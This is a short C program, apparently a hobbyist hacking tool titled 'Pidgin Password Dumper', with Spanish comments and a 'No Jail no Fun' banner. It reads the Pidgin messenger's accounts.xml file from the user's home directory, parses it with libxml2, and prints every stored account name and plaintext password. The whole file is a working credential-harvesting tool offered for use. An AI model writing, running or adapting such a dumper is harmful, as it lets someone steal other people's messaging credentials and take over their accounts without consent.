/*
  =============================================
  Pidgin Password Dumper v0.1


  Date: 10/04/12
  mail: elcorreodesylar at gmail.com
  devolper: oPen syLar
  ==============================================

*/



#include <stdio.h>
#include <string.h>
#include <libxml/parser.h>
#include <libxml/tree.h>

int main(int argc, char *argv[])
{

    puts("==========================\ndevel: oPen syLar\nlicencia: GPLv3\nmail: elcorreodesylar@gmail.com\nNo Jail no Fun\n=========================\n");

    xmlDocPtr hDoc;
    char path[256];

    if(argv[1]!=NULL)
    hDoc=xmlParseFile(argv[1]);

        else
        {
            snprintf(path, sizeof(path), "%s/.purple/accounts.xml", getenv("HOME"));
            hDoc=xmlParseFile(path);

            if(hDoc==NULL)
            {
                puts("[!] Lo siento hamijo no encuentro el path por defecto\n[!] Pidgin no esta instaldo =(");

            return -123;
            }
        }

    xmlNode *account, *normalnode, *rootNode=xmlDocGetRootElement(hDoc);

    if(hDoc!=NULL)
    {
        normalnode= rootNode->xmlChildrenNode;

        while(normalnode!=NULL)
        {
            if(!strcmp((const char *)normalnode->name, "account"))
            {
                account=normalnode->xmlChildrenNode;

                while(account!=NULL)
                {
                    //Si es el nodo name printea y busca su password
                    if(!strcmp((const char *)account->name, "name"))
                    {
                        printf("AccountName = '%s'\n", xmlNodeGetContent (account));

                        //Avanzamos 2 "nodos" mas abajo
                        account=account->next;
                        account=account->next;

                        //(Si el fichero no esta malformado) Deberia ser el pass
                        if(!strcmp((const char *)account->name, "password"))
                        printf("AccountPwd= '%s'\n", xmlNodeGetContent (account));
                    }

                account=account->next;
                }
            }


        normalnode=normalnode->next;
        }
    }
    puts("");

    //Memoria que haz de tomar.. Dejala correr
    xmlFreeDoc(hDoc);
}
